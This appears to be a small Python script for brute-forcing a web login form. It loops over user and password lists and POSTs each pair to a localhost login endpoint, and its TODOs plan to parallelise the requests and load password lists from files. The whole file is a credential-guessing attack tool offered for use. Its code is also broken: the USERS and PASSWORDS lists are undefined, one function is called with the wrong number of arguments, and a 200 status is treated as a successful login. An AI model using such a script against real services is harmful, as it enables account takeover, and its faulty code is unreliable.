import requests
from sys import exit

# TODO: change requests to asyncio to perform multiple requests at the same time.
# TODO: Import PASSWORDS from a file.

def do_request(url, user, username_field, password_field):
    for password in PASSWORDS:
        payload = {
            username_field: user,
            password_field: password,
        }
        request = requests.post(url, data=payload)

        if request.status_code == 200:
            print('USER FOUND!!!!!!', user, password)
            exit()

def do_users(url, username_field, password_field):
    for user in USERS:
        do_request(user, url, user, username_field, password_field)    

def main():
    do_users('http://localhost:5000/login', 'username', 'password')

if __name__ == '__main__':
    main()